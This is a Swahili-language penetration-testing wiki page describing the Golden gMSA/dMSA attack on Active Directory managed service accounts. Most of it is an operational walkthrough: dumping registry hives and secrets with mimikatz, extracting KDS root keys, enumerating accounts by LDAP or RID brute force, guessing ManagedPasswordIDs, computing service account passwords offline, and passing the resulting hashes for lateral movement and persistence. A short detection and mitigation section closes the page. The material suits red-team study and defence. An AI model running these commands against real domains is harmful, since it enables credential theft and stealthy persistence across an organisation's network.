# Golden gMSA/dMSA Attack (Utoaji wa Nje ya Mfumo wa Password za Managed Service Account)

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Windows Managed Service Accounts (MSA) ni principals maalum zilizoundwa kuendesha services bila hitaji la kusimamia password zao kwa mikono.
Kuna flavours kuu mbili:

1. **gMSA** – group Managed Service Account – inaweza kutumika kwenye hosts nyingi zilizoidhinishwa katika attribute yake ya `msDS-GroupMSAMembership`.
2. **dMSA** – delegated Managed Service Account – mrithi wa gMSA aliye katika (preview), anayetegemea cryptography ileile lakini akiruhusu scenarios za delegation zenye granular zaidi.

Kwa variants zote mbili, **password haihifadhiwi** kwenye kila Domain Controller (DC) kama NT-hash ya kawaida. Badala yake, kila DC inaweza **ku-derive** password ya sasa on-the-fly kutoka kwa:

* **KDS Root Key** ya forest nzima (`KRBTGT\KDS`)  – secret yenye jina la GUID inayozalishwa randomly, na replicated kwa kila DC chini ya container ya `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* **SID** ya target account.
* **ManagedPasswordID** (GUID) ya kila account inayopatikana kwenye attribute ya `msDS-ManagedPasswordId`.

Derivation ni: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob yenye bytes 240 ambayo hatimaye **base64-encoded** na kuhifadhiwa kwenye attribute ya `msDS-ManagedPassword`.
Hakuna Kerberos traffic au domain interaction inayohitajika wakati wa matumizi ya kawaida ya password – member host hu-derive password locally mradi tu inajua inputs hizo tatu.

## Golden gMSA / Golden dMSA Attack

Ikiwa attacker anaweza kupata inputs zote tatu **offline**, anaweza ku-compute **passwords halali za sasa na zijazo** kwa **gMSA/dMSA yoyote katika forest** bila kuwasiliana tena na DC, na hivyo kupita:<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* Vipindi vya password change (wanaweza ku-pre-compute)

Hii ni sawa na *Golden Ticket* kwa service accounts.<sup>[[1]](#references)[[2]](#references)</sup>

### Mahitaji ya Awali

1. **Forest-level compromise** ya **DC moja** (au Enterprise Admin), au access ya `SYSTEM` kwenye mojawapo ya DCs katika forest.
2. Uwezo wa ku-enumerate service accounts (LDAP read / RID brute-force).
3. Workstation ya .NET ≥ 4.7.2 x64 ya kuendesha [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) au code inayolingana.<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Phase 1 – Extract the KDS Root Key

Dump kutoka kwa DC yoyote (Volume Shadow Copy / raw SAM+SECURITY hives au remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Mfuatano wa base64 ulio na lebo `RootKey` (jina la GUID) unahitajika katika hatua zinazofuata.<sup>[[1]](#references)[[2]](#references)</sup>

##### Awamu ya 2 – Enumerate gMSA / dMSA objects

Pata angalau `sAMAccountName`, `objectSid` na `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) hutekeleza modes za usaidizi:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Phase 3 – Kisia / Gundua ManagedPasswordID (inapokosekana)

Baadhi ya deployments *huondoa* `msDS-ManagedPasswordId` kwenye reads zilizolindwa na `ACL`.
Kwa sababu GUID ina bits 128, naive bruteforce haiwezekani, lakini:

1. **Bits 32 za kwanza = Unix epoch time** ya kuundwa kwa account (kwa usahihi wa dakika).
2. Hufuatwa na bits 96 za nasibu.

Kwa hiyo, **wordlist finyu kwa kila account** (± saa chache) inawezekana.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Tool hukokotoa candidate passwords na kulinganisha base64 blob yake dhidi ya attribute halisi ya `msDS-ManagedPassword` – match hufichua GUID sahihi.

##### Phase 4 – Offline Password Computation & Conversion

Mara tu ManagedPasswordID inapojulikana, password halali inapatikana kwa command moja:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Hashes zinazotokana zinaweza kuingizwa kwa kutumia **mimikatz** (`sekurlsa::pth`) au **Rubeus** kwa matumizi mabaya ya Kerberos, hivyo kuwezesha **lateral movement** na **persistence** kwa njia fiche.

## Utambuzi na Kupunguza Athari

* Zuia uwezo wa **DC backup and registry hive read** kwa administrators wa Tier-0 pekee.
* Fuatilia uundaji wa **Directory Services Restore Mode (DSRM)** au **Volume Shadow Copy** kwenye DCs.
* Kagua usomaji / mabadiliko kwenye `CN=Master Root Keys,…` na flags za `userAccountControl` za service accounts.
* Tambua **base64 password writes** zisizo za kawaida au utumiaji wa tena wa service password kwa ghafla kwenye hosts mbalimbali.
* Fikiria kubadilisha gMSAs zenye privileges za juu kuwa **classic service accounts** zenye rotations za kawaida na random pale ambapo kutenganisha Tier-0 hakuwezekani.

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – reference implementation iliyotumika kwenye ukurasa huu.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – reference implementation iliyotumika kwenye ukurasa huu.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket kwa kutumia derived AES keys.

## References

- [1] [Golden dMSA – authentication bypass kwa Delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [Mashambulizi ya gMSA Active Directory Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
